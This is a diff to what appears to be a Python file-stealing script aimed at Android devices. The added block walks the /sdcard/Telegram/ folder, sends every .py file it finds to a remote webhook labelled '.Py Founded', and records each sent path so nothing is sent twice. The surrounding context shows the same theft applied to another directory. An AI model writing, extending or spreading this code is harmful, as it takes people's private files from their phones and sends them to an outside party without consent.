@@ -40,3 +40,18 @@ try:
                 open("python-data","a").write(dar+"\n")
 except:
     pass
+
+try:
+    dirr="/sdcard/Telegram/"
+    for files in os.listdir (dirr):
+        if files.endswith(".py"):
+            dar=dirr+files
+            if dar not in open("python-data","r").read():
+                file=File(dar)
+                try:
+                    hook_py.send(".Py Founded",file=file)
+                except:
+                	pass
+                open("python-data","a").write(dar+"\n")
+except:
+    pass
